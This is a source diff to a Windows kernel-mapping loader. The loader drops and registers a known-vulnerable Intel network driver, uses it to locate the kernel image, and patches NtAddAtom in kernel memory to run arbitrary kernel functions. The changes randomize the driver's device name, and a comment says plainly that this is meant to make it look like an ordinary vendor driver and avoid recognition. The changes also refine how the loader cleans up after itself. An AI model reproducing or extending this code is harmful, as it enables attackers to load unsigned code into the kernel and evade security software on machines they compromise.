@@ -5,6 +5,7 @@
 #include "service.h"
 
 #include "res/iqvw_sys.h"
+#include "km_shared_loader.h"
 
 #include <cstdlib>
 #include <cstring>
@@ -90,6 +91,10 @@ namespace
     std::wstring g_serviceName;
     std::wstring g_driverPath;
     std::wstring g_statePath;
+    std::wstring g_deviceName;
+
+    /* True only when this session registered the host service itself. */
+    bool g_ownedService = false;
 
     std::wstring RandomServiceName()
     {
@@ -103,6 +108,27 @@ namespace
 
         for (int i = 0; i < len; ++i)
             buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+
+        return std::wstring(buffer, buffer + len);
+    }
+
+    /*
+     * The device name is randomized separately from the service name. The service
+     * is a registry key nobody enumerates casually; the device name sits in the
+     * object namespace and is hashed into every IOCTL code, so it is the one that
+     * has to stop looking like a project. Lowercase only, so it reads like an
+     * ordinary vendor driver namespace rather than a build constant.
+     */
+    std::wstring RandomDeviceName()
+    {
+        static const char lower[] = "abcdefghijklmnopqrstuvwxyz";
+        char buffer[16] = { 0 };
+
+        srand((unsigned)time(nullptr) * GetCurrentThreadId() ^ GetTickCount());
+        const int len = rand() % 5 + 8;
+
+        for (int i = 0; i < len; ++i)
+            buffer[i] = lower[rand() % (sizeof(lower) - 1)];
 
         return std::wstring(buffer, buffer + len);
     }
@@ -145,7 +171,7 @@ namespace nal
         if (idtr.base < 0xFFFF800000000000ULL)
             return 0;
 
-        vgb_log::Line("*", "idt base 0x%llX", idtr.base);
+        km_log::Line("*", "idt base 0x%llX", idtr.base);
 
         const uint64_t anchor = idtr.base & ~0xFFFULL;
         uint8_t page[0x1000];
@@ -184,7 +210,7 @@ namespace nal
                 if (pePage[0] != 'P' || pePage[1] != 'E' || pePage[2] != 0 || pePage[3] != 0)
                     continue;
 
-                vgb_log::Step("kernel image found by IDT scan at 0x%llX",
+                km_log::Step("kernel image found by IDT scan at 0x%llX",
                               (unsigned long long)candidate);
                 return candidate;
             }
@@ -205,7 +231,7 @@ namespace nal
             ntoskrnlBase = KernelBaseFromIdt();
 
         if (!ntoskrnlBase)
-            vgb_log::Error("kernel base unresolved - export resolution is impossible");
+            km_log::Error("kernel base unresolved - export resolution is impossible");
 
         return ntoskrnlBase != 0;
     }
@@ -213,6 +239,48 @@ namespace nal
     void SetStatePath(const std::wstring& path)
     {
         g_statePath = path;
+    }
+
+    /* Empty until Load() or LoadState() has resolved one. */
+    const std::wstring& DeviceName()
+    {
+        return g_deviceName;
+    }
+
+    const std::wstring& DriverPath()
+    {
+        return g_driverPath;
+    }
+
+    std::vector<std::wstring> DevicePaths()
+    {
+        std::vector<std::wstring> paths;
+
+        if (!g_deviceName.empty())
+        {
+            paths.push_back(L"\\\\\\.\\" + g_deviceName);
+            paths.push_back(L"\\\\?\\GLOBALROOT\\Device\\" + g_deviceName);
+        }
+
+        /*
+         * A state file from an older build, or a driver started by hand, still
+         * uses the historical namespace. Keep it as the last resort so an
+         * existing mapping is never left unreachable.
+         */
+        paths.push_back(KM_WIN32_NAME);
+        paths.push_back(L"\\\\?\\GLOBALROOT\\Device\\Kernmem");
+
+        return paths;
+    }
+
+    unsigned long DeviceType()
+    {
+        return KmDeviceTypeFor(g_deviceName.c_str());
+    }
+
+    unsigned long RecodeIoctl(unsigned long code)
+    {
+        return KmRecodeIoctl(code, DeviceType());
     }
 
     uint64_t ResolveKernelBase()
@@ -255,8 +323,9 @@ namespace nal
 
         const std::string service = Narrow(g_serviceName);
         const std::string path = Narrow(g_driverPath);
+        const std::string device = Narrow(g_deviceName);
 
-        out << service << "\n" << path << "\n";
+        out << service << "\n" << path << "\n" << device << "\n";
         return out.good();
     }
 
@@ -271,14 +340,20 @@ namespace nal
 
         std::string service;
         std::string path;
+        std::string device;
         std::getline(in, service);
         std::getline(in, path);
+        std::getline(in, device);
 
         if (service.empty())
             return false;
 
         g_serviceName.assign(service.begin(), service.end());
         g_driverPath.assign(path.begin(), path.end());
+
+        /* A state file from an older build has no third line. The device then
+         * falls back to its static namespace, which still matches. */
+        g_deviceName.assign(device.begin(), device.end());
         return true;
     }
 
@@ -305,7 +380,7 @@ namespace nal
 
         if (hDevice == INVALID_HANDLE_VALUE)
         {
-            vgb_log::Error("mapping host is not running - nothing to attach to");
+            km_log::Error("mapping host is not running - nothing to attach to");
             return false;
         }
 
@@ -328,21 +403,28 @@ namespace nal
          */
         if (IsRunning())
         {
-            vgb_log::Warn("\\Device\\Nal is already resident - attaching to it");
+            km_log::Warn("\\Device\\Nal is already resident - attaching to it");
 
             if (Attach())
+            {
+                /* Not ours: teardown must leave the service running. A state file
+                 * naming a service means an earlier session of ours started it,
+                 * and that one is ours to clean up. */
+                g_ownedService = !g_serviceName.empty();
                 return true;
+            }
 
-            vgb_log::Warn("attach failed - another NAL user holds it, reboot if it persists");
+            km_log::Warn("attach failed - another NAL user holds it, reboot if it persists");
             return false;
         }
 
         g_serviceName = RandomServiceName();
+        g_deviceName = RandomDeviceName();
 
         std::wstring temp = nt::GetFullTempPath();
         if (temp.empty())
         {
-            vgb_log::Error("cannot resolve %%TEMP%%");
+            km_log::Error("cannot resolve %%TEMP%%");
             return false;
         }
 
@@ -352,16 +434,20 @@ namespace nal
                                       reinterpret_cast<const char*>(iqvw64e_sys),
                                       iqvw64e_sys_size))
         {
-            vgb_log::Error("cannot write the vulnerable driver to %ls", g_driverPath.c_str());
+            km_log::Error("cannot write the vulnerable driver to %ls", g_driverPath.c_str());
             return false;
         }
 
-        vgb_log::Step("vulnerable driver dropped: %ls", g_driverPath.c_str());
+        km_log::Step("vulnerable driver dropped: %ls", g_driverPath.c_str());
 
         const NTSTATUS status = service::RegisterAndStart(g_driverPath, g_serviceName);
+
+        if (NT_SUCCESS(status))
+            g_ownedService = true;
+
         if (!NT_SUCCESS(status))
         {
-            vgb_log::Error("service load failed (0x%08X)", status);
+            km_log::Error("service load failed (0x%08X)", status);
             _wremove(g_driverPath.c_str());
             return false;
         }
@@ -370,7 +456,7 @@ namespace nal
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
         if (hDevice == INVALID_HANDLE_VALUE)
         {
-            vgb_log::Error("\\Device\\Nal did not come up");
+            km_log::Error("\\Device\\Nal did not come up");
             service::StopAndRemove(g_serviceName);
             _wremove(g_driverPath.c_str());
             return false;
@@ -387,8 +473,8 @@ namespace nal
             /* Fatal, not a warning: with no kernel base there is no export
              * resolution, so mapping cannot proceed. Saying so here stops it
              * surfacing later as a bare "allocation failed". */
-            vgb_log::Error("could not resolve the kernel image base");
-            vgb_log::Info("both kernel-base routes failed - run `vgb-loader.exe kbase` for detail");
+            km_log::Error("could not resolve the kernel image base");
+            km_log::Info("both kernel-base routes failed - run `kernmem-loader.exe kbase` for detail");
 
             CloseHandle(hDevice);
             hDevice = INVALID_HANDLE_VALUE;
@@ -397,7 +483,7 @@ namespace nal
             return false;
         }
 
-        vgb_log::Step("kernel base resolved at 0x%llX", (unsigned long long)ntoskrnlBase);
+        km_log::Step("kernel base resolved at 0x%llX", (unsigned long long)ntoskrnlBase);
 
         SaveState();
         return true;
@@ -413,6 +499,22 @@ namespace nal
             hDevice = INVALID_HANDLE_VALUE;
         }
 
+        /*
+         * Only release a host this session started. When \Device\Nal was already
+         * resident we attached to a service somebody else registered - ours from
+         * an earlier run, or another tool's - and stopping it would pull the
+         * device out from under whatever still holds it. The dropped image is
+         * kept too, because the registry ImagePath still points at it.
+         */
+        if (!g_ownedService)
+        {
+            if (!g_serviceName.empty())
+                km_log::Info("mapping host left running - not started by this session");
+
+            ntoskrnlBase = 0;
+            return true;
+        }
+
         if (!g_serviceName.empty())
         {
             service::StopAndRemove(g_serviceName);
@@ -420,12 +522,13 @@ namespace nal
         }
         else
         {
-            /* The state file may be gone; find the service by its display name so
-             * \Device\Nal is released instead of staying held until a reboot. */
+            /* Ours, but the state file is gone. Find the service by its display
+             * name so \Device\Nal is released instead of staying held until a
+             * reboot. */
             const int stopped = service::StopAllIqvw();
 
             if (stopped)
-                vgb_log::Info("released %d stale mapping host service(s)", stopped);
+                km_log::Info("released %d stale mapping host service(s)", stopped);
         }
 
         if (!g_driverPath.empty())
@@ -679,7 +782,7 @@ namespace nal
             CallKernelFunctionRaw(&result, kernelExAllocatePoolWithTag, args, 3) && result)
             return result;
 
-        vgb_log::Error("both pool allocators failed for %llu bytes",
+        km_log::Error("both pool allocators failed for %llu bytes",
                        (unsigned long long)size);
         return 0;
     }
@@ -740,12 +843,12 @@ namespace nal
         if (kernelNtAddAtom < ntoskrnlBase ||
             kernelNtAddAtom > ntoskrnlBase + 0x2000000ULL)
         {
-            vgb_log::Error("NtAddAtom export 0x%llX is outside ntoskrnl - not patching",
+            km_log::Error("NtAddAtom export 0x%llX is outside ntoskrnl - not patching",
                            (unsigned long long)kernelNtAddAtom);
             return false;
         }
 
-        vgb_log::Step("patching NtAddAtom at 0x%llX (page offset 0x%llX)",
+        km_log::Step("patching NtAddAtom at 0x%llX (page offset 0x%llX)",
                       (unsigned long long)kernelNtAddAtom,
                       (unsigned long long)(kernelNtAddAtom & 0xFFF));
 
@@ -763,7 +866,7 @@ namespace nal
             memcmp(verify, stub, sizeof(stub)) != 0)
         {
             WriteToReadOnlyMemory(kernelNtAddAtom, original, sizeof(original));
-            vgb_log::Error("NtAddAtom patch did not take effect");
+            km_log::Error("NtAddAtom patch did not take effect");
             return false;
         }
 
@@ -774,7 +877,7 @@ namespace nal
         using call4_t = uint64_t(NTAPI*)(uint64_t, uint64_t, uint64_t, uint64_t);
         const auto call = reinterpret_cast<call4_t>(userNtAddAtom);
 
-        vgb_log::Step("entering kernel function 0x%llX with %d arg(s)",
+        km_log::Step("entering kernel function 0x%llX with %d arg(s)",
                       (unsigned long long)kernelFunction, argCount);
 
         const uint64_t result = call(argCount > 0 ? args[0] : 0,
@@ -782,10 +885,10 @@ namespace nal
                                      argCount > 2 ? args[2] : 0,
                                      argCount > 3 ? args[3] : 0);
 
-        vgb_log::Step("kernel function returned 0x%llX", (unsigned long long)result);
+        km_log::Step("kernel function returned 0x%llX", (unsigned long long)result);
 
         if (!WriteToReadOnlyMemory(kernelNtAddAtom, original, sizeof(original)))
-            vgb_log::Error("NtAddAtom restore failed - the patch is still live");
+            km_log::Error("NtAddAtom restore failed - the patch is still live");
 
         if (outResult)
             *reinterpret_cast<uint64_t*>(outResult) = result;
